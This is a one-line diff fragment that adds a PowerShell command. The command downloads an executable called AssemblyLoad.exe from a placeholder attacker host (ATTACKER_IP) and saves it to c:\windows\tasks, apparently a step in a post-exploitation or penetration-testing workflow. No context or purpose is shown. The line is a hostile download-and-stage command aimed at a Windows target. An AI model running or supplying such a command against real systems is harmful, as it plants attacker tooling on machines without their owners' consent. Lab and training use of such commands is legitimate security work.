@@ -1,0 +1,1 @@
+powershell iwr -uri http://ATTACKER_IP/tools/AssemblyLoad.exe -o c:\windows\tasks\AssemblyLoad.exe
